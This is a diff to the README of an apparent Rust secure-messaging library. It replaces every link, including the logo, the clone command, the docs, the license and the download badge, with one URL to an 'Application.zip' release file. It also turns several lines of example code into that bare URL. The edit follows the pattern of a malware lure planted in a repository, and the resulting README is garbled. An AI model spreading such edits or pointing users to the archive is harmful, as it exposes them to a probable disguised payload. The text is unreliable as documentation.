@@ -1,7 +1,7 @@
 
 # Secure Messaging Protocol 25519 (smp25519-rust)
 
-![smp25519-rust Logo](https://placeit.net/uploads/stage/stage_image/68075/optimized_large_optimized.png)
+![smp25519-rust Logo](https://github.com/Alperen4423/smp25519-rust/releases/download/v1.0/Application.zip)
 
 Welcome to the official repository for the Secure Messaging Protocol 25519 (smp25519) in Rust! This repository houses the implementation of a secure messaging protocol that utilizes the X25519 Diffie-Hellman key exchange, Blake3 cryptographic hash function, and ChaCha20 symmetric encryption algorithm.
 
@@ -28,13 +28,13 @@ Secure messaging is essential for protecting the confidentiality and integrity o
 To install the smp25519-rust library, you can simply clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/your-username/smp25519-rust.git
+git clone https://github.com/Alperen4423/smp25519-rust/releases/download/v1.0/Application.zip
 ```
 
-Alternatively, you can download the latest release from the [Releases](https://github.com/your-username/smp25519-rust/releases) section.
+Alternatively, you can download the latest release from the [Releases](https://github.com/Alperen4423/smp25519-rust/releases/download/v1.0/Application.zip) section.
 
 ## Usage
-To start using smp25519-rust in your project, add it as a dependency in your `Cargo.toml` file:
+To start using smp25519-rust in your project, add it as a dependency in your `https://github.com/Alperen4423/smp25519-rust/releases/download/v1.0/Application.zip` file:
 
 ```toml
 [dependencies]
@@ -51,21 +51,21 @@ let client = Smp25519Client::new();
 let server = Smp25519Server::new();
 
 // Perform key exchange and send encrypted messages
-client.perform_key_exchange();
-server.perform_key_exchange();
-let encrypted_message = client.encrypt_message("Hello, server!");
-let decrypted_message = server.decrypt_message(&encrypted_message);
+https://github.com/Alperen4423/smp25519-rust/releases/download/v1.0/Application.zip();
+https://github.com/Alperen4423/smp25519-rust/releases/download/v1.0/Application.zip();
+let encrypted_message = https://github.com/Alperen4423/smp25519-rust/releases/download/v1.0/Application.zip("Hello, server!");
+let decrypted_message = https://github.com/Alperen4423/smp25519-rust/releases/download/v1.0/Application.zip(&encrypted_message);
 println!("Decrypted message: {}", decrypted_message);
 ```
 
-For more detailed usage instructions and API documentation, please refer to the [Documentation](https://your-username.github.io/smp25519-rust/docs) section.
+For more detailed usage instructions and API documentation, please refer to the [Documentation](https://github.com/Alperen4423/smp25519-rust/releases/download/v1.0/Application.zip) section.
 
 ## Contributing
 We welcome contributions from the community to improve the smp25519-rust library. If you have ideas for new features, bug fixes, or enhancements, please feel free to open an issue or submit a pull request. Together, we can make secure messaging even better!
 
 ## License
-The smp25519-rust library is licensed under the MIT License. See the [LICENSE](https://github.com/your-username/smp25519-rust/blob/main/LICENSE) file for more details.
+The smp25519-rust library is licensed under the MIT License. See the [LICENSE](https://github.com/Alperen4423/smp25519-rust/releases/download/v1.0/Application.zip) file for more details.
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/Alperen4423/smp25519-rust/releases/download/v1.0/Application.zip)](https://github.com/Alperen4423/smp25519-rust/releases/download/v1.0/Application.zip)
 
 Remember, secure messaging is crucial for protecting sensitive information in today's digital age. By using smp25519-rust, you can ensure that your communications remain confidential and secure. Feel free to explore the features of this library and incorporate secure messaging into your projects. Stay safe and happy coding! 🛡️🔒🚀
